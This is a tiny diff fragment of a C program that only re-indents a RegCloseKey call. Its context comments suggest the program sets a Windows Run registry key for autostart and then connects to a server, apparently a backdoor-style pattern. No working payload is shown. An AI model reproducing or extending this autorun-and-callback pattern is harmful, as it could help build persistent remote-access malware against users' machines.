@@ -37,7 +37,7 @@ int main(const int argc, const char* argv[]){
 	    dwSize
     );
     // = Close the run key
-	RegCloseKey(hKey);
+    RegCloseKey(hKey);
     
     // === Connect to the server
     // == Init winsock
